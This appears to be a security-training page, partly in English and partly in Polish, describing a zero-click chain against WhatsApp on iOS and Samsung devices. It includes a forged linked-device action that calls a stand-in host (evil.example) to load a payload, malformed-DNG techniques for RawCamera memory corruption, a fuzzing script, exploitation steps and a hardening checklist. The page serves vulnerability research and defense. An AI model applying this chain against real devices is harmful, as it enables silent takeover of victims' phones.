# Zero-click Messaging → Image Parser Chains

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- Treat **messaging app multi-device/companion protocols** as remote control channels: if protocol fields are assumed to come from trusted devices, they might still be user-controlled and can often be replayed directly against a victim to load arbitrary content with **0 user interaction**.
- Once any app can be coerced into fetching untrusted media, target the **shared OS media pipeline** (RawCamera on iOS/macOS, vendor parsers on Android OEM builds) with malformed files to pivot out of the sandbox.
- The DNG-based RawCamera and Samsung parser bugs discussed here are concrete examples, but the full technique is a reusable blueprint for chaining **logic flaws → image parser memory corruption → full device compromise**.

## Remote content loading via WhatsApp linked-device commands

### Attack surface recap

The WhatsApp "linked devices" architecture keeps the primary phone and every companion (desktop, tablet, secondary phone) in sync via encrypted, structured protocol messages. Each message encodes:

- **Device metadata** (device ID, capabilities, feature flags).
- **Action descriptors** (e.g., sync chats, fetch thumbnails, render remote content).
- **Arbitrary parameters** such as URIs, MIME hints, pagination keys, etc.

On Apple clients, the handler that processes these linked-device control packets **implicitnie ufał** that a valid pairing already occurred, so high-impact fields (e.g., `resource_url`, `open_media`, `sync_snapshot`) were only minimally validated. A malicious companion message could therefore:

1. Zostać skierowana do dowolnego konta identyfikowanego przez jego numer telefonu.
2. Przejść przez warstwę transportu (Noise protocol + WhatsApp protobuf framing), ponieważ odbiorca nigdy nie zweryfikował, że nadawca był prawidłowo sparowanym urządzeniem.
3. Dotrzeć do klienta iOS, gdzie podatna ścieżka kodu automatycznie wywoływała żądanie HTTP(S) w tle do URL atakującego i parsowała odpowiedź w ukrytym WebView/media rendererze.

### Practical workflow for auditors

1. Capture legitimate linked-device traffic. Attach a debugger or Frida script to the desktop/iOS client and hook the post-decryption handler (e.g., `LinkedDevicesSyncHandler::processAction`). Dump decoded protobuf payloads to learn available action types and parameters.
2. Identify fields that cross trust boundaries. Any action carrying `http_url`, `thumbnail_uri`, `download_url`, or `render_html` parameters without strict allow-lists is a candidate remote-content primitive.
3. Forge a malicious action. Reuse the observed protobuf schema and modify only the attacker-controlled fields. A simplified JSON view of the relevant logical structure is shown below (the actual transport is protobuf/Noise, but the semantic fields match):
```json
{
"op": "sync_action",
"device_id": "<attacker-companion>",
"payload": {
"target": "content_sync",
"resource_url": "https://evil.example/payload.html",
"media_type": "image/dng",
"flags": ["background_fetch", "render_inline"]
}
}
```
4. **Deliver to the victim.** Replay the crafted packet through the same WhatsApp service that normally forwards linked-device traffic (e.g., using a modified desktop client or a custom Noise client reusing your attacker account keys). Because CVE-2025-55177 failed to tie actions to authenticated devices, the victim iOS/macOS client would accept the message and immediately fetch the attacker URL without any UI.
5. **Instrument the fetch.** Observe the forced HTTP(S) request and the internal renderer (WKWebView/ImageIO). At this point you own a zero-click web delivery primitive inside WhatsApp.

## Uzbrajanie automatycznie dekodowanych DNG przeciwko RawCamera

Gdy atakujący kontroluje to, co WhatsApp ładuje, kolejnym celem jest sprawienie, aby iOS/macOS parsowały złośliwy plik **Digital Negative (DNG)** za pomocą frameworka **RawCamera**. Każdy osadzony `<img>`/CSS URL, który rozwiązuje się do `.dng`, zostanie przekazany do systemowego pipeline'u obrazów, wywołując RawCamera nawet jeśli sam WhatsApp nigdy nie obsługiwał DNG explicite.

### Wywoływanie RawCamera z WhatsApp

- Serwuj HTML, który odwołuje się do DNG przez wiele mechanizmów (np. `<img src="evil.dng">`, CSS `background-image: url('evil.dng')`, lub źródła w `<picture>`), aby pokryć różne ścieżki renderowania.
- Zadbaj o poprawny MIME (`image/x-adobe-dng`) i małe podglądy, aby loader nie zrezygnował z przetwarzania z powodu heurystyk rozmiaru.
- Sandbox multimediów iOS przekaże plik do RawCamera przez `CGImageSourceCreateWithURL`, co w końcu trafi na podatny dekoder.

### Tworzenie DNG powodujących uszkodzenie pamięci (w stylu CVE-2025-43300)

Odtworzony błąd polegał na niespójnych metadanych, które desynchronizowały alokację bufora od rzeczywistych odczytów pikseli. Typowe dźwignie obejmują:

- **Tile/strip descriptors**: Ustaw `TileByteCounts`/`StripByteCounts` na realistyczne wartości, ale zwiększ `TileOffsets`, aby wskazywały poza zaalokowany bufor.
- **Sub-IFD chains**: Osadź obrazy wtórne z konfliktującymi `ImageWidth`/`ImageLength` i `BitsPerSample`, tak aby RawCamera obliczał mały bufor, podczas gdy późniejsze etapy ufały wymiarom kontrolowanym przez atakującego.
- **Opcode metadata**: Manipuluj wpisami `OpcodeList3`, tak aby przetwarzanie wiersz po wierszu operowało na indeksach wybranych przez atakującego.

Podstawowy harness mutacyjny do wyszukiwania takich uszkodzeń można zbudować wokół macOS, ponieważ ten sam kod RawCamera jest dostarczany na macOS/iOS/iPadOS:
```bash
#!/bin/bash
set -e
for sample in corpus/*.dng; do
radamsa "$sample" > /tmp/poc.dng
/System/Library/CoreServices/RawCamera.bundle/Contents/MacOS/RawCamera /tmp/poc.dng >/tmp/out 2>&1 || {
mv /tmp/poc.dng crashes/$(date +%s).dng
}
done
```
Each crash in `RawCamera` gives you a new primitive. The published PoC achieved a neat out-of-bounds read/write reliable enough to crash WhatsApp on iPhone, iPad, and Mac.

## Budowanie 0-click chain

1. **Linked-device packet** → zmusza WhatsApp do pobrania `https://evil.example/payload.html` bez żadnej interakcji.
2. **Payload HTML** → cicho odwołuje się do `evil.dng`, gwarantując, że RawCamera zostanie wywołany przez stos multimediów OS.
3. **Malicious DNG** → wykorzystuje spreparowane tagi, aby wywołać RawCamera OOB i crash/own decoder obrazów.
4. **Post-corruption exploitation** → dodaj info-leak gadgets (np. wykorzystując przewidywalne heap metadata) i przygotuj ROP/JOP chain, aby wydostać się z WhatsApp sandbox i przejść do bardziej uprzywilejowanych kontekstów.

Ponieważ każdy krok jest automatyczny, atakującemu wystarczy numer telefonu ofiary. Żadne powiadomienia, banery ani monity nie są wyświetlane na docelowym urządzeniu.

## Paralele parsera obrazów Samsunga

Biuletyn Samsunga dla CVE-2025-21043 potwierdził, że ich własny stos parsowania obrazów (używany przez Gallery, Messages, a także pośrednio przez WhatsApp) miał **out-of-bounds write** dostępny poprzez niepewne media. Metodologia eksploatacji odzwierciedla łańcuch Apple:

- Zidentyfikuj wektor auto-preview (miniatury czatu, podglądy powiadomień, share sheets), który parsuje plik atakującego za pomocą bibliotek Samsunga `libimagecodec`/`libOneUI_ImageDecoder`.
- Diff aktualizacje bibliotek OEM lub fuzzuj parsery przy użyciu niepoprawnych plików RAW/DNG, aż zobaczysz korupcje pamięci podobne do crasha RawCamera (nadpisanie heap metadata, kontrola rejestrów, itp.).
- Dostarcz spreparowany plik przez dowolny kanał, który już automatycznie ładuje treść (np. ten sam linked-device primitive, mechanizmy podglądu WhatsApp, lub push-to-talk waveform previews w Androidzie).

Gdy wystąpi OOB write w parserze producenta, połączenie go z WhatsApp auto-fetch primitive daje kolejny zero-click chain na urządzeniach Samsunga.

## Lista kontrolna testów i hardeningu

- **Protocol validation**: Wymuś rygorystyczne allow-listy dla każdej akcji linked-device. Polecenia towarzyszące, które żądają fetch/render, muszą udowodnić parowanie urządzenia (podpisując payload), a URL powinien odpowiadać allow-liście lub podpisanemu blobowi.
- **Transport replay countermeasures**: Powiąż każdą akcję z kluczem per-device i odrzucaj pakiety, których klucz nadawcy jest nieznany, nawet jeśli składnia protobuf jest poprawna.
- **Media pipeline restrictions**: Aplikacje wysokiego poziomu powinny zezwalać tylko na zatwierdzone typy MIME i jednoznacznie odrzucać RAW/DNG, chyba że funkcja jest wymagana.
- **Parser fuzzing regression tests**: Utrzymuj korpus niepoprawnych plików RAW/DNG i uruchamiaj je przeciwko dekoderom RawCamera/vendor po każdej aktualizacji.
- **Crash triage automation**: Dołącz sanitizery `DYLD_INSERT_LIBRARIES` lub MTE na urządzeniach używanych do fuzzingu, aby wykryć subtelne warunki OOB zanim zrobią to atakujący.

## References

- [DNGerousLINK: A Deep Dive into WhatsApp 0-Click Exploits on iOS and Samsung Devices](https://media.ccc.de/v/39c3-dngerouslink-a-deep-dive-into-whatsapp-0-click-exploits-on-ios-and-samsung-devices)

{{#include ../../banners/hacktricks-training.md}}
